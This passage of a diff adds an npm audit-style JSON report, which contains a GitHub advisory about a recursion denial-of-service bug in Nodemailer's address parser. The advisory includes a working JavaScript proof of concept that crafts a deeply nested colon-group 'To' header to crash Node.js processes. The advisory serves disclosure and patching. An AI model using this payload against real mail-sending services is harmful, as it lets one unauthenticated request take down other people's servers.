attacker sends a header containing many colons, Nodemailer enters infinite recursion, eventually throwing Maximum call stack size exceeded and causing the process to terminate immediately. Due to the structure of this behavior, no authentication is required, and a single request is enough to shut down the service.\n\nThe problematic code section is as follows:\n```js\nif (isGroup) {\n    ...\n    if (data.group.length) {\n        let parsedGroup = addressparser(data.group.join(',')); // <- boom!\n        parsedGroup.forEach(member => {\n            if (member.group) {\n                groupMembers = groupMembers.concat(member.group);\n            } else {\n                groupMembers.push(member);\n            }\n        });\n    }\n}\n```\n`data.group` is expected to contain members separated by commas, but in the attacker’s payload the group contains colon `(:)` tokens. Because of this, the parser repeatedly triggers recursive calls for each colon, proportional to their number.\n\n### PoC\n\n```\nconst nodemailer = require('nodemailer');\n\nfunction buildDeepGroup(depth) {\n  let parts = [];\n  for (let i = 0; i < depth; i++) {\n    parts.push(`g${i}:`);\n  }\n  return parts.join(' ') + ' user@example.com;';\n}\n\nconst DEPTH = 3000; // <- control depth \nconst toHeader = buildDeepGroup(DEPTH);\nconsole.log('to header length:', toHeader.length);\n\nconst transporter = nodemailer.createTransport({\n  streamTransport: true,\n  buffer: true,\n  newline: 'unix'\n});\n\nconsole.log('parsing start');\n\ntransporter.sendMail(\n  {\n    from: 'test@example.com',\n    to: toHeader,\n    subject: 'test',\n    text: 'test'\n  },\n  (err, info) => {\n    if (err) {\n      console.error('error:', err);\n    } else {\n      console.log('finished :', info && info.envelope);\n    }\n  }\n);\n```\nAs a result, when the colon is repeated beyond a certain threshold, the Node.js process terminates immediately.\n\n### Impact\nThe attacker can achieve the following:\n\n1. Force an immediate crash of any server/service that uses Nodemailer\n2. Kill the backend process with a single web request\n3. In environments using PM2/Forever, trigger a continuous restart loop, causing severe resource exhaustion”",
+      "reported_by": null,
+      "title": "Nodemailer’s addressparser is vulnerable to DoS caused by recursive calls",
+      "metadata": null,
+      "cves": [
+        "CVE-2025-14874"
+      ],
+      "access": "public",
+      "severity": "high",
+      "module_name": "nodemailer",
+      "vulnerable_versions": "<=7.0.10",
+      "github_advisory_id": "GHSA-rcmh-qjqh-p98v",
+      "recommendation": "Upgrade to version 7.0.11 or later",
+      "patched_versions": ">=7.0.11",
+      "updated": "2026-02-12T22:09:03.000Z",
+      "cvss": {
+        "score": 7.5,
+        "vectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
+      },
+      "cwe": [
+        "CWE-703"
+      ],
+      "url": "https://github.com/advisories/GHSA-rcmh-qjqh-p98v"
+    }
+  },
+  "muted": [],
+  "metadata": {
+    "vulnerabilities": {
+      "info": 0,
+      "low": 10,
+      "moderate": 32,
+      "high": 31,
+      "critical": 3
+    },
+    "dependencies": 3437,
+    "devDependencies": 0,
+    "optionalDependencies": 0,
+    "totalDependencies": 3437
+  }
+}
